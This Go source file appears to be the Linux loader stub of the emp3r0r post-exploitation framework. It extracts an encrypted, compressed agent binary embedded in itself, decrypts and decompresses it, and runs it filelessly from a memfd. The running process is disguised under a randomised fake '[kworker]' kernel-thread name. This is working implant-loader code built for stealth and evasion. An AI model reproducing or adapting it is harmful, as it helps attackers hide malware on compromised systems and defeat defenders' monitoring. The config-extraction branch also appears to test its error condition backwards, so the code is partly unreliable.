//go:build linux
// +build linux

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func main() {
	// find embeded ELF
	encElfBytes, err := util.DigEmbeddedDataFromArg0()
	if err != nil {
		e := err
		log.Printf("DigEmbeddedDataFromArg0: %v", err)
		encElfBytes, err = util.DigEmbededDataFromMem()
		if err != nil {
			log.Fatalf("DigEmbeddedDataFromArg0: %v. DigEmbededDataFromMem: %v", e, err)
		}
	}

	// decrypt attached ELF file
	key := tun.GenAESKey(emp3r0r_data.MagicString)
	elfdata := tun.AESDecryptRaw(key, encElfBytes)
	if elfdata == nil {
		log.Fatal("AESDecrypt failed")
	}

	// decompress
	var decompressedBytes []byte
	gz := &archiver.Gz{CompressionLevel: 9}
	r := bytes.NewReader(elfdata)
	extracted_agent_elf := bytes.NewBuffer(decompressedBytes)
	err = gz.Decompress(r, extracted_agent_elf)
	if err != nil {
		log.Fatalf("Decompress ELF: %v", err)
	}

	// write self to memfd
	self_elf_data, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		log.Printf("read self: %v", err)
	}
	fd := util.MemFDWrite(self_elf_data)
	if fd < 0 {
		log.Print("MemFDWrite failed")
	}
	os.Setenv("FD", fmt.Sprintf("%d", fd))

	// extract config JSON
	// set env so that agent can read config from it
	config_data, err := util.DigEmbeddedData(extracted_agent_elf.Bytes())
	if err != nil {
		os.Setenv("MOTD", fmt.Sprintf("%s", config_data))
	}

	// run from memfd
	procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
	util.MemfdExec(procName, extracted_agent_elf.Bytes())
}
